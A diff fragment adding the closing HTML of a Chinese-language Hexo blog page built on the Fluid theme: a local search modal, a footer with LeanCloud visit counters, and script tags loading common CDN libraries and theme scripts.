+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/Romanc9" target="_blank" rel="nofollow noopener"><span>Luoman</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- LeanCloud 统计PV -->
+        <span id="leancloud-site-pv-container" style="display: none">
+            总访问量 
+            <span id="leancloud-site-pv"></span>
+             次
+          </span>
+      
+      
+        <!-- LeanCloud 统计UV -->
+        <span id="leancloud-site-uv-container" style="display: none">
+            总访客数 
+            <span id="leancloud-site-uv"></span>
+             人
+          </span>
+      
+
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
